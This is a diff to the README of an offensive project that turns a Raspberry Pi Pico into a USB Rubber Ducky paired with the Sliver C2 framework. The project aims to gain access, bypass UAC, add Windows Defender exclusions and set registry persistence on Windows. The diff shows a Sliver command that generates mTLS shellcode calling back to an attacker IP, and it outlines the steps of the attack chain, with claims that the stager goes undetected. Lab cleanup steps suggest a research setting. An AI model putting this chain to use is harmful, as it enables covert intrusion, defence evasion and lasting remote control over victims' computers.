@@ -2,7 +2,7 @@
 This project implements a hardware-based attack vector using a Raspberry Pi Pico configured as a USB Rubber Ducky, combined with the Sliver Command & Control (C2) framework. The implementation provides initial access, UAC bypass, and persistence mechanisms on Windows systems.
 
 ## 🎥 Project Demonstration
-<video src="https://github.com/user-attachments/assets/7cbad957-2417-4a98-98bd-3e7f2a256e99" controls width="800"></video>
+<video src="https://github.com/user-attachments/assets/0ca78224-0c1f-4e34-a916-025a2fd1942d" controls width="800"></video>
 
 ## Architecture Diagram
                      Physical Access
@@ -112,7 +112,7 @@ Ensure all files are placed in their designated locations as shown in the projec
 
 #### Important: IP Address Configuration
 
-**Replace `<attacker's IP>` with your Kali machine's IP in all files where it appears.**
+**Replace `<Attacker's IP>` with your Kali machine's IP in all files where it appears.**
 
 ### 1. Pico Initial Setup
 
@@ -152,6 +152,7 @@ C:\Program Files\Microsoft Visual Studio\18\Community> cl.exe bypass.c
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ [127.0.0.1] sliver > generate --mtls <attacker's IP>:443 --os windows --arch amd64 --format shellcode --save /home/kali/c2/update.bin
+                       >none
 ```
 
 ### 6. Generate persistence.exe
@@ -173,13 +174,13 @@ C:\Program Files\Microsoft Visual Studio\18\Community> cl.exe bypass.c
 1. **Initial Execution**: When the Pico device is plugged in, `payload.dd` executes `launcher.vbs`
 2. **UAC Bypass**: `launcher.vbs` runs `bypass.exe` which:
     - Bypasses Windows UAC
-    - Adds current user's `AppData\Roaming` folder to Defender exclusions
+    - Adds current `C:\Windows\Temp` folder to Defender exclusions
 3. **Payload Download**: Waits 10 seconds, then downloads `hidden.vbs` and `persistence.exe`
 4. **Shell Access**: Executes `stager.exe` providing the attacker with a Sliver session
 5. **Persistence**: `open.ps1` adds `hidden.vbs` to registry for persistence after restart
 
 ## ⚠️ Important Behavioral Notes
-The bypass.exe file serves a single, specific purpose: disabling Windows Defender real‑time protection for the %AppData%\Roaming folder. This is strictly required to allow the persistence.exe implant and hidden.vbs launcher to remain on disk without being quarantined after a system reboot.
+The bypass.exe file serves a single, specific purpose: disabling Windows Defender real‑time protection for the `C:\Windows\Temp` folder. This is strictly required to allow the persistence.exe implant and hidden.vbs launcher to remain on disk without being quarantined after a system reboot.
 
 The initial stager session is already fully undetected: The stager.exe payload executed directly by the Pico provides a working Sliver session without needing bypass.exe at all. The stager and core implant are built using Sliver’s default evasion techniques and are completely undetected by Windows Defender at the time of execution.
 
@@ -220,3 +221,7 @@ After completing the experiment:
 6. Disconnect the Pico-Ducky.
 7. Revert the Windows VM to its clean snapshot.
 8. Remove temporary build artifacts from Kali if no longer required.
+
+## Acknowledgement
+
+The bypass.c implementation used in this project was originally developed by [@redcivet](https://github.com/redcivet). The author has granted permission for its use and inclusion in this project.
